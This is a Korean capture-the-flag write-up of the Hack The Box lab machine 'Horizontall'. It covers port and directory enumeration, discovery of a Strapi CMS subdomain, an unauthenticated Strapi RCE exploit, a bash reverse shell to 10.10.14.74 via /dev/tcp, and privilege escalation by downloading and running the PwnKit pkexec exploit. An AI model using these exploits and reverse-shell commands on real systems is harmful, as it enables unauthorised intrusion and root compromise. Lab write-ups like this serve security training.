# Horizontall
IP: 10.129.214.77


## 정보 수집

nmap을 사용해서 포트스캔 

```bash
nmap -Pn -p- -n --open --max-retries 1 --min-rate 2000 $ip
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
포트 스캔결과 22,80번 포트가 열려있는것 확인
![nmap](img/nmap.png)
```bash
nmap -sV -sC -oA nmap/Horizontall $ip -p 22,80 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

각 포트별 현재 사용중인 시스템 버전은  
- 22 ssh  OpenSSH 7.6p1  
- 80 http nginx 1.14.0

> |_http-title: Did not follow redirect to http://horizontall.htb


웹서버에서 리다이렉션 했으나 실패 로컬에 등록해야함

```bash
#/etc/hosts 에 아래줄 추가
10.129.214.77   horizontall.htb
```
![etchost](img/etchost.png)
웹페이지 접속해서 분석결과 정적인 페이지  
![webpage](img/webpage.png)

웹디렉토리 브루트 포싱 시도  

```bash
gobuster dir -u http://horizontall.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt

/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/favicon.ico          (Status: 200) [Size: 4286]
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/index.html           (Status: 200) [Size: 901]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/]
```
별다른 파일, 디렉토리 찾지 못함  
ffuf로 하위도메인 탐색 별다른 하위도메인 찾지 못함  

웹페이지 소스 다시한번 분석  
http://horizontall.htb/js/chunk-vendors.0e02b89e.js  
![js](img/js.png)

![subdomain](img/subdomain.png)
난독화되어있는 js코드 https://beautifier.io/ 에서 읽을 수 있게 바꾼 후 분석  

```bash
cat app.js | grep -i horizontall
                        href: "https://horizontall.htb"
                }, [t._v("Horizontall.htb")])])])])
                        r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
        t.exports = e.p + "img/horizontall.2db2bc37.png"
```

http://api-prod.horizontall.htb/ 하위도메인을 찾음

```bash
#/etc/hosts 에 아래줄 추가
10.129.214.77   api-prod.horizontall.htb
```

http://api-prod.horizontall.htb 접속
![welcome](img/welcome.png)
아무것도 없이 정적페이지 다시 웹디렉토리 탐색
```bash
gobuster dir -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/ADMIN                (Status: 200) [Size: 854]
/favicon.ico          (Status: 200) [Size: 1150]
/index.html           (Status: 200) [Size: 413]
/reviews              (Status: 200) [Size: 507]
/robots.txt           (Status: 200) [Size: 121]
/robots.txt           (Status: 200) [Size: 121]
/users                (Status: 403) [Size: 60]

```

/admin,/Admin,ADMIN 접속 시  
http://api-prod.horizontall.htb/admin/auth/login 로그인페이지로 리다이렉션됨
![strapi](img/strapi.png)
strapi CMS를 사용중이란것 확인

/reviews 에서 회원아이디로 추정되는 정보
![reviews](img/reviews.png)
## 취약점 & 익스플로잇 분석
```bash
searchsploit strapi  
![searchsploit](img/searchsploit.png)
Strapi 3.0.0-beta - Set Password (Unauthenticated)
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)       
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) 
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit) 
```
현재 버전을 확인하지 못했음 일단 인증이 필요없는 취약점 부터 사용

Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) 

```bash
searchsploit -m 50239.py
python3 50239.py http://api-prod.horizontall.htb/  
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzU0NDA3MDU5LCJleHAiOjE3NTY5OTkwNTl9.DcygFSCDGQ08l_ot68-V4geIePLvRPpaiDfFDeq264M

$> ls
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```
RCE exploit은 성공했으나 blind RCE라서 값이 출력은 되지않음
셸을 얻기 위해 리버스셸 코드 실행

bash -c 'exec bash -i &>/dev/tcp/10.10.14.74/9999 <&1'
![alt text](image-4.png)


```bash
# 셸 안정화
strapi@horizontall:~/myapi$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -nlvp 9999
![revshell](img/revshell.png)                                                                                                                                             
┌──(root㉿kali)-[~/Hack_The_Box/Horizontall]
└─# stty raw -echo;fg   
[1]  + continued  nc -nlvp 9999

strapi@horizontall:~/myapi$ 
```
/home/developer 디렉토리에서 user.txt 플래그를 찾음음

```bash
strapi@horizontall:/home/developer$ cat user.txt 
03c7fcc0f0124c56a4af687250c8250a
```

## Privilege-Escalation

setuid 탐색
```bash
strapi@horizontall:/tmp$ find / -perm -4000 -type f 2> /dev/null
/usr/bin/pkexec # 취약점 존재
```
![setuid](img/setuid.png)
https://github.com/ly4k/PwnKit 루트킷 설치

```bash
#kali linux
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python3 -m http.server 7777 
#대상 호스트
wget http://10.10.14.74:7777/PwnKit
chmod +x PwnKit 
./PwnKit
id
uid=0(root) gid=0(root) groups=0(root),1001(strapi)  
```
![root](img/root.png)
루트권한을 얻음

```bash
cat /root/root.txt                   
e7931bd6e9f0a01d00e008d5cdd5e005 
```

# 취약점
- 취약한 버전의 Strapi CMS 3.0.0-beta.17.4 사용
- 잘못된 setuid 설정 /usr/bin/pkexec 권한상승 취약점이 존재하는 바이너리 파일이 setuid설정 되어있음음

